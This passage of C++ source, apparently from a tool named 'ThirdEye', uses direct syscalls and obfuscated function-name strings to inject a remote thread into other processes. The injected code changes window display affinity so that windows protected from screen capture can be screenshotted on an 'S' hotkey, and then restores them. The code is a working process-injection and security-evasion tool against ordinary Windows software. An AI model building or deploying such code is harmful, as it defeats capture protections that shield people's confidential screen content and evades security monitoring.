        static constexpr auto obfSetWDA = MAKE_OBF("NtUserSetWindowDisplayAffinity");
        static constexpr auto obfGetWDA = MAKE_OBF("NtUserGetWindowDisplayAffinity");

        if (!SafeCopyString(data.libName, DECR_STR(obfWin32u)) ||
            !SafeCopyString(data.setFuncName, DECR_STR(obfSetWDA)) ||
            !SafeCopyString(data.getFuncName, DECR_STR(obfGetWDA))) {
            NtCloseDirect(hProcess);
            continue;
        }

        LPVOID pRemoteData = NtAllocateMemoryDirect(hProcess, sizeof(INJECTION_DATA), PAGE_READWRITE);
        if (!pRemoteData) {
            NtCloseDirect(hProcess);
            continue;
        }

        LPVOID pRemoteCode = NtAllocateMemoryDirect(hProcess, sectionSize, PAGE_READWRITE);
        if (!pRemoteCode) {
            NtFreeMemoryDirect(hProcess, pRemoteData);
            NtCloseDirect(hProcess);
            continue;
        }

        bool b1 = NtWriteMemoryDirect(hProcess, pRemoteData, &data, sizeof(INJECTION_DATA));
        bool b2 = NtWriteMemoryDirect(hProcess, pRemoteCode, (PVOID)RemoteThreadProc, sectionSize);

        ULONG oldProtect = 0;
        bool b3 = NtProtectMemoryDirect(hProcess, pRemoteCode, sectionSize, PAGE_EXECUTE_READ, &oldProtect);

        if (!b1 || !b2 || !b3) {
            NtFreeMemoryDirect(hProcess, pRemoteData);
            NtFreeMemoryDirect(hProcess, pRemoteCode);
            NtCloseDirect(hProcess);
            continue;
        }

        HANDLE hThread = NtCreateThreadDirect(hProcess, pRemoteCode, pRemoteData);
        if (!hThread) {
            NtFreeMemoryDirect(hProcess, pRemoteData);
            NtFreeMemoryDirect(hProcess, pRemoteCode);
            NtCloseDirect(hProcess);
            continue;
        }

        activeInjections.push_back({ hProcess, hThread, pRemoteData, pRemoteCode, pid });
    }

    if (!activeInjections.empty()) {
        std::cout << "[*] Waiting for " << activeInjections.size() << " processes to apply patch..." << std::endl;

        int readyCount = 0;

        for (size_t i = 0; i < activeInjections.size(); i++) {
            DWORD waitResult = WaitForSingleObject(hReadySemaphore.get(), 1000);
            if (waitResult == WAIT_OBJECT_0) {
                readyCount++;
            } else {
                std::cout << "[!] Timeout waiting for process " << i << std::endl;
            }
        }
        std::cout << "[*] Ready: " << readyCount << "/" << activeInjections.size() << std::endl;
    }

    SaveScreenshot();

    std::cout << "[*] Restoring affinities..." << std::endl;
    SetEvent(hGlobalTrigger.get());

    for (auto& ctx : activeInjections) {
        NtWaitDirect(ctx.hThread, 5000);
        NtFreeMemoryDirect(ctx.hProcess, ctx.pRemoteData);
        NtFreeMemoryDirect(ctx.hProcess, ctx.pRemoteCode);
        NtCloseDirect(ctx.hThread);
        NtCloseDirect(ctx.hProcess);
    }

    std::cout << "[*] Done." << std::endl;
}

[[noreturn]] int main() {
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

    std::cout << "[*] ThirdEye" << std::endl;

    if (!InitializeSyscalls()) {
        std::cerr << "[!] Failed to resolve syscall numbers!" << std::endl;
        exit(1);
    }

    std::cout << "[*] Press 'S' to capture." << std::endl;
    std::cout << std::endl;

    while (true) {
        if (GetAsyncKeyState(0x53) & 0x8000) {
            Capture();
            Sleep(1000);
        }
        Sleep(50);
    }
}